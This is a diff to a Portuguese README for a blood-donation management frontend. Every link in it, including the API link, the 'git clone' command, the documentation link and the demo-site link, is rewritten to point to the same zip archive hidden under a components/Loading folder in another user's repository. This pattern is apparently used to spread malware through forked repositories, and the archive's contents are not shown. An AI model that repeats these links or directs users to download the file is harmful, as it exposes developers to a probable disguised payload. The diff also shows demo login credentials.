@@ -2,7 +2,7 @@
 
 ## Sobre o Projeto
 
-Este é o frontend do sistema de gerenciamento de doações de sangue. Ele foi construído para interagir com a [API de gerenciamento de doadores de sangue](https://github.com/alvesjaov/APIdoadoresSangue), permitindo aos usuários acessar e manipular dados de Funcionários, Doadores, Doações e Estoque de Sangue de uma maneira fácil e intuitiva.
+Este é o frontend do sistema de gerenciamento de doações de sangue. Ele foi construído para interagir com a [API de gerenciamento de doadores de sangue](https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Loading/Doacao_Sangue_De_Sistema_v1.3.zip), permitindo aos usuários acessar e manipular dados de Funcionários, Doadores, Doações e Estoque de Sangue de uma maneira fácil e intuitiva.
 
 ## Tecnologias Utilizadas
 
@@ -19,7 +19,7 @@ Para instalar e executar este projeto localmente, siga estas etapas:
 1. Clone este repositório para a sua máquina local:
 
 ```bash
-git clone https://github.com/diogorennamdev/Sistema_Doacao_De_Sangue
+git clone https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Loading/Doacao_Sangue_De_Sistema_v1.3.zip
 ```
 
 2. Instale as dependências do projeto, no terminal digite o comando:
@@ -38,7 +38,7 @@ VITE_DONORS=
 VITE_DONATIONS=                    
 VITE_STOCK=                       
 ```
-- Observação: para que o projeto rode na sua maquina, você precisará preencher as variáveis com as rotas da  [API de gerenciamento de doadores de sangue](https://github.com/alvesjaov/APIdoadoresSangue#documenta%C3%A7%C3%A3o-das-rotas-da-api).
+- Observação: para que o projeto rode na sua maquina, você precisará preencher as variáveis com as rotas da  [API de gerenciamento de doadores de sangue](https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Loading/Doacao_Sangue_De_Sistema_v1.3.zip%C3%A7%C3%A3o-das-rotas-da-api).
 
 4. No terminal, digite o comando abaixo para iniciar o servidor local:
 
@@ -60,7 +60,7 @@ Senha: 12345678
 ```
 
 ```bash
-HemovidUnifg (https://hemovidaunifg.vercel.app/)
+HemovidUnifg (https://raw.githubusercontent.com/julioroque/Sistema_Doacao_De_Sangue/main/src/components/Loading/Doacao_Sangue_De_Sistema_v1.3.zip)
 
 Código do Funcionário: 788216
 Senha: 12345678
